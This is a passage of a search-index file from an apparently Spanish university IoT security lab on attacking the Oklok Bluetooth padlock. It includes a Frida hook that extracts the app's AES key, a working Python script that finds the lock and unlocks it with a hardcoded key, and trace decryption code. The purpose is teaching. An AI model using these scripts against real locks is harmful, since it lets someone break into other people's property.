he localizado el qu\u00e9). Wireshark actualizado y sin privilegios (requiere logout ). Wireshark permite monitorizar la red del Host si se configura en modo bridged y con la configuraci\u00f3n Promiscuous mode: Allow all. sudo add-apt-repository ppa:wireshark-dev/stable sudo apt-get update sudo apt-get install wireshark sudo dpkg-reconfigure wireshark-common sudo addgroup masteriot wireshark Bettercap : Descargar y copiar el binario precompilado en /sbin/ , necesita librer\u00edas Jadx : Descargar y copiar en /opt/jadx-1.1.0 Nota: este programa consume muchos recursos, asignar 4GiB y 2 CPUs en la MV sudo apt-get install libpcap-dev libnetfilter-queue-dev","title":"VirtualBox Ubuntu Mate 18.04 64b"},{"location":"hack-the-lock/#raspberry-pi-android-9-lineageos-160","text":"Enlace a la imagen original LineageOS 16.0 . Para poder descargar el fichero deber\u00e9is de estar identificados con la cuenta de correo de la UCM . Manual: LineageOS 16.0 (Android 9) Necesario conectar un monitor HDMI sin adaptador, o configurar a mano la resoluci\u00f3n seg\u00fan manual. Pasos del manual necesarios: Habilitar opciones de desarrollador Habilitar acceso de root Otras consideraciones: Bot\u00f3n de apagado: F5 Es necesario activar adb por red Habilitar log bluetooth Servidor frida: frida-server-14.2.8-android-arm","title":"Raspberry Pi Android 9 (LineageOS 16.0)"},{"location":"hack-the-lock/#apks-y-utilidades","text":"","title":"Apks y utilidades"},{"location":"hack-the-lock/#android-apk","text":"Os dejo dos versiones antiguas de la App Oklok que no est\u00e1n muy ofuscadas: oklok_v1.3.0.apk oklok_v1.5.7.apk","title":"Android Apk"},{"location":"hack-the-lock/#script-frida","text":"Script para conseguir la clave mediante Frida: Java.perform(function () { var CMDUtils = Java.use('com.coolu.blelibrary.utils.CMDUtils'); var log_byte_array = function (arr) { var result = \"\"; var buffer = Java.array('byte', arr); for(var i = 0; i < buffer.length; ++i) { var hexb = (buffer[i] & 0xFF).toString(16); if (hexb.length == 1) hexb = '0' + hexb; result += hexb; } console.log(result); }; CMDUtils.Encrypt.implementation = function (pt, key) { console.log('[+] Inside Encrypt() ======'); var ct = this.Encrypt(pt, key); console.log('Pt:') log_byte_array(pt) console.log('key:') log_byte_array(key); return ct; }; CMDUtils.Decrypt.implementation = function (ct, key) { console.log('[+] Inside Decrypt() ======'); var pt = this.Decrypt(ct, key); console.log('Pt:') log_byte_array(pt) console.log('Key:') log_byte_array(key); return pt; }; });","title":"Script Frida"},{"location":"hack-the-lock/#script-de-apertura","text":"Script Python 2 para abrir el candado (una vez que conocemos la clave AES ): from bluepy.btle import Scanner, Peripheral, DefaultDelegate from Crypto.Cipher import AES AESKEY = '034100624f0a29355c193f1a39192356' class MyDelegate(DefaultDelegate): def __init__(self): DefaultDelegate.__init__(self) self.token = None def handleNotification(self, cHandle, data): cipher = AES.new(AESKEY.decode('hex'), AES.MODE_ECB) pt = cipher.decrypt(data) if pt.startswith('\\x06\\x02\\x07'): self.token = pt[3:7] print '[+] Token:', self.token.encode('hex') def connect(addr): print '[+] Connecting' p = Peripheral(addr) write_char = p.getCharacteristics(uuid='000036f5-0000-1000-8000-00805f9b34fb')[0] notify_char = p.getCharacteristics(uuid='000036f6-0000-1000-8000-00805f9b34fb')[0] # Enable notifications, https://stackoverflow.com/a/15722811 p.writeCharacteristic(7, '0100'.decode('hex'), withResponse=True) d = MyDelegate() p.withDelegate(d) gettokencmd = '06010101' + '0'*24 gettokstr = AES.new(AESKEY.decode('hex'), AES.MODE_ECB).encrypt(gettokencmd.decode('hex')) print '[+] Sending GET_TOKEN command' write_char.write(gettokstr, withResponse=True) p.waitForNotifications(2) if d.token != None: cipher = AES.new(AESKEY.decode('hex'), AES.MODE_ECB) # Send unlock command pt = '050106303030303030'.decode('hex') + d.token + '\\x00\\x00\\x00' write_char.write(cipher.encrypt(pt)) print '[+] Sent unlock command' def main(): s = Scanner() print '[+] Scanning for 5s...' s.scan(5) for dev in s.getDevices(): if dev.getValueText(0x9) == 'BlueFPL': print '[+] Found OKLOK' connect(dev.addr) break if __name__ == '__main__': main()","title":"Script de apertura"},{"location":"hack-the-lock/#analisis-de-trafico-bt-de-una-secuencia-de-apertura","text":"Ejemplo de captura y an\u00e1lisis de tr\u00e1fico mediante Wireshark: btsnoop_hci.log Salida de Frida por pantalla: $ frida -U -l oklok-frida_new.js com.oklok.y ____ / _ | Frida 14.2.8 - A world-class dynamic instrumentation toolkit | (_| | > _ | Commands: /_/ |_| help -> Displays the help system . . . . object? -> Display information about 'object' . . . . exit/quit -> Exit . . . . . . . . More info at https://www.frida.re/docs/home/ [VirtualBox::com.oklok.y]-> [VirtualBox::com.oklok.y]-> [+] Inside Encrypt() ====== Pt: 060101015705162b7c5b34162b4b4b2e --> Traza N\u00ba 101 key: 034100624f0a29355c193f1a39192356 [+] Inside Encrypt() ====== Pt: 0602077464a8bd010205000000000000 --> Traza N\u00ba 103 Key: 034100624f0a29355c193f1a39192356 [+] Inside Decrypt() ====== Pt: 06010101644c391e5b6a4f3237477a78 --> Traza N\u00ba 105 key: 034100624f0a29355c193f1a39192356 [+] Inside Decrypt() ====== Pt: 0602077464a8bd010205000000000000 --> Traza N\u00ba 107 Key: 034100624f0a29355c193f1a39192356 [+] Inside Encrypt() ====== Pt: 020101017464a8bd2f22114d0c157e65 --> Traza N\u00ba 109 key: 034100624f0a29355c193f1a39192356 [+] Inside Decrypt() ====== Pt: 0202015e64a8bd010205000000000000 --> Traza N\u00ba 112 Key: 034100624f0a29355c193f1a39192356 [+] Inside Encrypt() ====== Pt: 0501063030303030307464a8bd1f0375 --> Traza N\u00ba 113 key: 034100624f0a29355c193f1a39192356 [+] Inside Decrypt() ====== Pt: 0502010064a8bd010205000000000000 --> Traza N\u00ba 121 Key: 034100624f0a29355c193f1a39192356 [+] Inside Decrypt() ====== Pt: 050d010064a8bd010205000000000000 --> Traza N\u00ba 123 Key: 034100624f0a29355c193f1a39192356 Process terminated [VirtualBox::com.oklok.y]-> Script de Python 2 an\u00e1lisis de trazas: #!/usr/bin/python2.7 from Crypto.Cipher import AES import binascii aeskey=\"034100624f0a29355c193f1a39192356\" aesobj = AES.new(aeskey.decode(\"hex\"), AES.MODE_ECB) wiresharkpacket = \"64642f5d28a845260d9c3b7464d1003f\" print \"Traza 101: \" + str(aesobj.decrypt(wiresharkpacket.decode(\"hex\")).encode('hex')) wiresharkpacket = \"b7375edcb4311b888c78b794fa828853\" print \"Traza 103: \" + str(aesobj.decrypt(wiresharkpacket.decode(\"hex\")).encode('hex')) wiresharkpacket = \"d349035cb778578f78761a9b6b2344fd\" print \"Traza 105: \" + str(aesobj.decrypt(wiresharkpacket.decode(\"hex\")).encode('hex')) wiresharkpacket = \"b7375edcb4311b888c78b794fa828853\" print \"Traza 107: \" + str(aesobj.decrypt(wiresharkpacket.decode(\"hex\")).encode('hex')) wiresharkpacket = \"e2608fd9ec82d3f082962256188ca320\" print \"Traza 109: \" + str(aesobj.decrypt(wiresharkpacket.decode(\"hex\")).encode('hex')) wiresharkpacket = \"7c961523beeabc82b97305e1facb1d41\" print \"Traza 112: \" + str(aesobj.decrypt(wiresharkpacket.decode(\"hex\")).encode('hex')) wiresharkpacket = \"62a0972768b33fbe2fb95456c36b9bf6\" print \"Traza 113: \" + str(aesobj.decrypt(wiresharkpacket.decode(\"hex\")).encode('hex')) wiresharkpacket = \"71dda074a979da25e1b51f51d8689a72\" print \"Traza 121: \" + str(aesobj.decrypt(wiresharkpacket.decode(\"hex\")).encode('hex')) wiresharkpacket = \"e8a8855bb311de5ad1d12e79a5206d89\" print \"Traza 123: \" + str(aesobj.decrypt(wiresharkpacket.decode(\"hex\")).encode('hex'))","title":"An\u00e1lisis de tr\u00e1fico BT de una secuencia de apertura"},{"location":"lib/python3.8/site-packages/Markdown-3.3.7.dist-info/LICENSE/","text":"Copyright 2007, 2008 The Python Markdown Project (v. 1.7 and later) Copyright 2004, 2005, 2006 Yuri Takhteyev (v. 0.2-1.6b) Copyright 2004 Manfred Stienstra (the original version) All rights reserved. Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met: Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution. Neither the name of the Python Markdown Project nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission. THIS SOFTWARE IS PROVIDED BY THE PYTHON MARKDOWN PROJECT ''AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL ANY CONTRIBUTORS TO THE PYTHON MARKDOWN PROJECT BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.","title":"LICENSE"}]}